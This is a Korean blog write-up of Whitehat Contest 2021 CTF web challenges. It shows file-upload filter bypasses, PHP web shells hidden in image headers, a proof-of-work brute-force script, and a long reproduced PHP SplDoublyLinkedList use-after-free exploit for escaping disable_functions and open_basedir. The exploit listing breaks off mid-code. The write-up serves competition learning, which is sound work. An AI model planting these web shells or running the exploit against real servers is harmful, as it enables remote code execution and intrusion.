<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Whitehat Contest 2021 Write Up :: My New Hugo Site</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This article is about write-up for the Whitehat Contest 2021. there is only three web and one pwn, misc challenges, all of which contain Time Based SQL Injection and RCE and  bug" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.404error.life/posts/2021-09-12-whitehat-contest/" />







  
  
  
  
  
  <link rel="stylesheet" href="https://blog.404error.life/styles.css">







  <link rel="shortcut icon" href="https://blog.404error.life/img/theme-colors/orange.png">
  <link rel="apple-touch-icon" href="https://blog.404error.life/img/theme-colors/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Whitehat Contest 2021 Write Up">
<meta property="og:description" content="This article is about write-up for the Whitehat Contest 2021. there is only three web and one pwn, misc challenges, all of which contain Time Based SQL Injection and RCE and  bug" />
<meta property="og:url" content="https://blog.404error.life/posts/2021-09-12-whitehat-contest/" />
<meta property="og:site_name" content="My New Hugo Site" />

  
    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2021-09-12 23:29:53 &#43;0000 UTC" />













  


</head>
<body class="">




<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://blog.404error.life/">
  <div class="logo">
    re-Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.404error.life/posts/2021-09-12-whitehat-contest/">Whitehat Contest 2021 Write Up</a>
  </h1>
  <div class="post-meta"><time class="post-date">2021-09-12</time>
    
</div>

  
  



  

  <div class="post-content"><div>
        <h1 id="web-imageflare-100-pts">(Web) Imageflare [100 pts]<a href="#web-imageflare-100-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>Imageflare 문제는 파일 업로드 취약점을 이용해 웹쉘을 업로드 한 뒤에 RCE를 이용해 플래그를 획득하는 문제입니다.</p>
</blockquote>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/1.png?raw=true" alt=""></p>
<p>일단 문제를 보면 위와 같이 파일 업로드 기능이 주어지고, 파일 업로드를 할 때 마다 Pow 값을 맞춰줘야 한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10000000</span>) :
</span></span><span style="display:flex;"><span>    input <span style="color:#f92672">=</span> uuid<span style="color:#f92672">.</span>uuid4()
</span></span><span style="display:flex;"><span>    input <span style="color:#f92672">=</span> str(input)
</span></span><span style="display:flex;"><span>    sha_1 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
</span></span><span style="display:flex;"><span>    sha_1<span style="color:#f92672">.</span>update(input<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>    inputsha <span style="color:#f92672">=</span> sha_1<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    inputsha5 <span style="color:#f92672">=</span> inputsha[:<span style="color:#ae81ff">5</span>]
</span></span><span style="display:flex;"><span>    pow <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> inputsha5 <span style="color:#f92672">==</span> pow :
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] &#34;</span> <span style="color:#f92672">+</span> input)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] end..&#34;</span>)
</span></span></code></pre></div><p>Pow 값은 위 페이로드로 쉽게 획득할 수 있습니다.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/2.png?raw=true" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>php 파일을 업로드 해보니 필터링에 걸리는 것을 확인할 수 있었다. 그래서 여러번 파일 업로드를 하며 확인해본 결과 시그니처 값과 <code>&lt;?php &gt;</code> 문자열 존재만 확인하는 거 같았습니다. 그래서 그냥 아무 이미지 파일을 다운로드 하고, 이미지 헤더 내에 위 페이로드를 넣고, 파일 명은 <code>&lt;filename&gt;.php</code>로 업로드 하여 익스플로잇을 진행했습니다.</p>
<p>파일 업로드 후에 파일 명을 클릭하면 파일을 읽는 것이 아닌 다운로드가 되도록 구현되어 있었습니다. 여기서 저는 약간의 게싱을 이용해서 업로드 되는 디렉터리를 알아냈습니다. (/uploads/<!-- raw HTML omitted -->)</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/4.png?raw=true" alt=""></p>
<p>아까 위에서 올린 php 파일로 접근을 해보니 <code>7*7</code>가 그대로 실행 되어 출력되는 것을 확인할 수 있었습니다.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/7.png?raw=true" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>이번에는 위와 같이 이미지 헤더 내에 웹쉘 페이로드를 넣은 후에 업로드하고, 쉘 명령어를 실행해보니 잘 되는 것을 볼 수 있었고, 이를 이용해 플래그를 획득했습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG{ce9f5efd2c90c3f98fc61fcaf608f842}
</span></span></code></pre></div><hr>
<h1 id="web-mudbox-290-pts">(Web) Mudbox [290 pts]<a href="#web-mudbox-290-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>Mudbox 문제는  session_save_path()를 이용한 open_basedir 우회 기법 또는 UAF Sandbox Escape를 이용해 open_basedir 옵션을 우회하고, RCE 하는 문제 입니다.</p>
</blockquote>
<p>저는 ini_set(), chdir() 함수로 ini_set() 함수로 open_basedir 옵션을 우회하려고 밤을 새면서 시도 했는데, ini_set()을 이용해서 open_basedir을 전역에서 설정해주어도 ㅈㄴ 설정이 아예 안 됐습니다. 하지만 저는 이 방법을 고집하고, 계속 시도 하였지만 php.ini 설정 때문인지 이년이 끝까지 말을 안 듣더라구요 :)</p>
<p>결국 대회 끝나고 지인들한테 물어보니 첫 번째는 <code>session_save_path()</code>를 이용해서  open_basedir 우회하기 위해 <code>plugin/</code> 디렉터리에 웹쉘 올리고, LFI를 이용해서 해당 파일을 실행 시키는 방식이고, 두 번째는 잘 알려진 UAF Sandbox Escape 공격을 하는 것 입니다.</p>
<p>저도 대회때 UAF 공격을 한 번 시도 해보긴 했는데, 파일 크기 때문에 UAF POC 파일을 업로드 하지 못 해서, 공격을 못 했는데, 지금 생각해보면 그냥 <code>&lt;?= eval($_GET['cmd']); ?&gt;</code>로 파일을 올리고, cmd 변수에 UAF Payload를 그냥 넘겨주면 됐었습니다.</p>
<p>또한 CCE 2020에서 nomorephp라는 문제와 싱크로율 100 ;; 그냥 ini_set()만 고집 안 했으면 풀었을 건데 아쉽네요.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/1.png?raw=true" alt=""></p>
<p>문제에서는 위와 같이 파일 업로드 기능을 제공하고 있고, php, phar, htm이 들어간 확장자는 모두 필터링에 걸리는데, pht 확장자를 이용해서 우회할 수 있습니다.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/2.png?raw=true" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>($_GET[<span style="color:#e6db74">&#39;code&#39;</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>그래서 일단 위 페이로드를 pht 확장자로 업로드 해주었습니다.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/3.png?raw=true" alt=""></p>
<p>업로드한 파일을 읽어 보니 php로 잘 인식하는 것을 확인 할 수 있습니다.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/rce.png?raw=true" alt=""></p>
<p>code 값으로 <code>phpinfo();</code>를 넘겨ㅡ주니 실행 또한 잘 되는 것을 확인 할 수 있습니다.</p>
<pre tabindex="0"><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,getenv,putenv
</code></pre><p><code>phpinfo();</code>에서 disable_functions 설정을 확인 해보니 위와 같이 여러 함수들이 비활성화 되어 있는 것을 확인 할 수 있습니다.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.45.14.png?raw=true" alt=""></p>
<p>그리고 혹시나 해서 <code>open_basedir</code> 설정도 확인 해보니 위와 같이 <code>/tmp:/var/www/html/data</code> 설정 되어 있는 것을 확인 했습니다. 플래그는 현재 <code>/flag</code>에 있습니다. 또한 우리가 업로드 하는 웹쉘도 <code>data/</code> 하위에 생성이 되기 때문에 <code>data/</code> 디렉터리에서 현재 경로 및 하위 파일들만 건들 수 있습니다.</p>
<p>그래서 open_basedir을 우회해서 최상위 디렉터리에 있는 <code>/flag</code>를 읽어야 합니다.</p>
<p>open_basedir을 우회하는 첫 번째 방식은 잘 알려진 UAF Sandbox Escape를 이용하는 것 입니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># PHP SplDoublyLinkedList::offsetUnset UAF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Charles Fol (@cfreal_)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># 2020-08-07
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># PHP is vulnerable from 5.3 to 8.0 alpha
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># This exploit only targets PHP7+.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># Said iteration is done by keeping a pointer to the &#34;current&#34; DLL element.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># You can then call next() or prev() to make the DLL point to another element.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># When you delete an element of the DLL, PHP will remove the element from the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># DLL, then destroy the zval, and finally clear the current ptr if it points
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># to the element. Therefore, when the zval is destroyed, current is still
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># pointing to the associated element, even if it was removed from the list.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># This allows for an easy UAF, because you can call $dll-&gt;next() or
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># $dll-&gt;prev() in the zval&#39;s destructor.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;NB_DANGLING&#39;</span>, <span style="color:#ae81ff">200</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;SIZE_ELEM_STR&#39;</span>, <span style="color:#ae81ff">40</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;STR_MARKER&#39;</span>, <span style="color:#ae81ff">0xcf5ea1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">i2s</span>(<span style="color:#f92672">&amp;</span>$s, $p, $i, $x<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$j<span style="color:#f92672">&lt;</span>$x;$j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $s[$p<span style="color:#f92672">+</span>$j] <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</span>($i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>);
</span></span><span style="display:flex;"><span>        $i <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">s2i</span>(<span style="color:#f92672">&amp;</span>$s, $p, $x<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($j<span style="color:#f92672">=</span>$x<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;$j<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span>;$j<span style="color:#f92672">--</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $i <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>        $i <span style="color:#f92672">|=</span> <span style="color:#a6e22e">ord</span>($s[$p<span style="color:#f92672">+</span>$j]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $i;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UAFTrigger</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#&#34;print(&#39;UAF __destruct: &#39; . &#34;\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $dlls[<span style="color:#a6e22e">NB_DANGLING</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">offsetUnset</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># At this point every $dll-&gt;current points to the same freed chunk. We allocate
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># that chunk with a string, and fill the zval part
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $fake_dll_element <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_shuffle</span>(<span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#a6e22e">SIZE_ELEM_STR</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i2s</span>($fake_dll_element, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x12345678</span>); <span style="color:#75715e"># ptr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">i2s</span>($fake_dll_element, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x00000004</span>, <span style="color:#ae81ff">7</span>); <span style="color:#75715e"># type + other stuff
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Each of these dlls current-&gt;next pointers point to the same location,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># the string we allocated. When calling next(), our fake element becomes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># the current value, and as such its rc is incremented. Since rc is at
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># the same place as zend_string.len, the length of the string gets bigger,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># allowing to R/W any part of the following memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">NB_DANGLING</span>; $i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>            $dlls[$i]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($fake_dll_element) <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">SIZE_ELEM_STR</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Exploit failed: fake_dll_element did not increase in size&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $leaked_str_offsets <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>        $leaked_str_zval <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># In the memory after our fake element, that we can now read and write,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># there are lots of zend_string chunks that we allocated. We keep three,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># and we keep track of their offsets.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">for</span>($offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">SIZE_ELEM_STR</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; $offset <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">strlen</span>($fake_dll_element) <span style="color:#f92672">-</span> <span style="color:#ae81ff">40</span>; $offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">40</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># If we find a string marker, pull it from the string list
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">s2i</span>($fake_dll_element, $offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">STR_MARKER</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                $leaked_str_offsets[] <span style="color:#f92672">=</span> $offset;
</span></span><span style="display:flex;"><span>                $leaked_str_zval[] <span style="color:#f92672">=</span> $strs[<span style="color:#a6e22e">s2i</span>($fake_dll_element, $offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>)];
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">count</span>($leaked_str_zval) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">count</span>($leaked_str_zval) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Exploit failed: unable to leak three zend_strings&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># free the strings, except the three we need
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $strs <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Leak adress of first chunk
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">unset</span>($leaked_str_zval[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unset</span>($leaked_str_zval[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unset</span>($leaked_str_zval[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>        $first_chunk_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">s2i</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># At this point we have 3 freed chunks of size 40, which we can read/write,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># and we know their address.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Address of first RW chunk: 0x&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($first_chunk_addr) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># In the third one, we will allocate a DLL element which points to a zend_array
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $rw_dll<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">push</span>([<span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>        $array_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">s2i</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Change the zval type from zend_object to zend_string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">i2s</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00000006</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">gettype</span>($rw_dll[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;string&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Exploit failed: Unable to change zend_array to zend_string&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># We can now read anything: if we want to read 0x11223300, we make zend_string*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># point to 0x11223300-0x10, and read its size using strlen()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Read zend_array-&gt;pDestructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $zval_ptr_dtor_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($array_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Leaked zval_ptr_dtor address: 0x&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($zval_ptr_dtor_addr) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Use it to find zif_system
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $system_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_system_address</span>($zval_ptr_dtor_addr);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Got PHP_FUNCTION(system): 0x&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($system_addr) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># In the second freed block, we create a closure and copy the zend_closure struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># to a string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $rw_dll<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">push</span>(<span style="color:#66d9ef">function</span> ($x) {});
</span></span><span style="display:flex;"><span>        $closure_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">s2i</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>);
</span></span><span style="display:flex;"><span>        $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_shuffle</span>(<span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">0x200</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x138</span>; $i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">i2s</span>($data, $i, <span style="color:#a6e22e">read</span>($closure_addr <span style="color:#f92672">+</span> $i));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Change internal func type and pointer to make the closure execute system instead
